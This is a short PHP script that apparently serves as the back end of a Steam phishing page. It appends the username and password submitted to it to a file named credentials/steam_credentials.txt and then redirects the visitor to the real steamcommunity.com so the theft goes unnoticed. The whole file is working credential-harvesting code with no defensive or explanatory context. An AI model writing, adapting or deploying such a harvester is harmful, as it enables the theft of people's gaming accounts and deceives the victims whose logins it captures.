<?php

file_put_contents("credentials/steam_credentials.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://steamcommunity.com');
exit();
